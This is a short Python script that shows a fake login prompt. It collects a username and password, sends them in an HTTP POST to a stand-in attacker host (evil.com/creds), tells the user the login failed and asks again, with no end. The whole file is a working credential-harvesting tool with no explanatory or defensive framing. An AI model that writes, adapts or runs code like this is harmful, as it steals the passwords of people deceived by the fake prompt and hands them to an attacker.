import getpass, requests
def fake_login():
    u = input("Username: ")
    p = getpass.getpass("Password: ")
    requests.post('http://evil.com/creds',json={'username':u,'password':p})
    print("Failed. Try again.")
    return fake_login()
fake_login()
